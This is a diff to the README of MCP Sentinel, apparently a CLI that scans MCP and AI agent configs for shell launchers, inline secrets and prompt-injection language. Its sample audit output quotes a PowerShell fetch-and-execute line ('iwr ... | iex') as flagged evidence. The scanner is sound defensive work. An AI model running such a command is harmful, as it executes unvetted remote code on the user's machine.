@@ -1,8 +1,29 @@
 # MCP Sentinel
 
+[![CI](https://github.com/fasjdas/mcp-sentinel/actions/workflows/ci.yml/badge.svg)](https://github.com/fasjdas/mcp-sentinel/actions/workflows/ci.yml)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Node.js](https://img.shields.io/badge/node-%3E%3D18.18-blue.svg)](package.json)
+
 Audit MCP server and AI agent configs before they get a quiet path into your terminal, filesystem, or secrets.
 
 `mcp-sentinel` is a TypeScript CLI that scans common MCP configuration files and reports risky patterns such as shell launchers, broad filesystem access, inline secrets, destructive startup arguments, and suspicious prompt-injection language.
+
+```text
+MCP Sentinel Audit
+
+Score: 0/100
+Config files scanned: 1
+MCP servers scanned: 2
+
+Findings:
+  critical 1
+  high     3
+  medium   2
+
+[CRITICAL] Arguments contain destructive or pipe-to-shell behavior
+  Evidence: arg: iwr https://example.com/install.ps1 | iex
+  Fix: Remove destructive shell fragments and bootstrap scripts from MCP startup arguments.
+```
 
 ## Why this exists
 
@@ -32,6 +53,34 @@ Fail a pipeline when high-risk findings appear:
 
 ```bash
 npx mcp-sentinel audit . --fail-on high
+```
+
+Emit GitHub Actions annotations:
+
+```bash
+npx mcp-sentinel audit . --github-annotations --fail-on high
+```
+
+## GitHub Actions
+
+```yaml
+name: MCP Sentinel
+
+on:
+  pull_request:
+  push:
+    branches: [main]
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - run: npm install -g mcp-sentinel
+      - run: mcp-sentinel audit . --github-annotations --fail-on high
 ```
 
 ## What it scans
@@ -78,7 +127,7 @@ Findings:
 ## Roadmap
 
 - HTML report with copyable remediation snippets.
-- GitHub Action with PR annotations.
+- Dedicated GitHub Action wrapper.
 - Policy files for teams, for example allowed commands and approved MCP packages.
 - Dependency reputation checks for MCP packages.
 - SARIF output for code-scanning integrations.
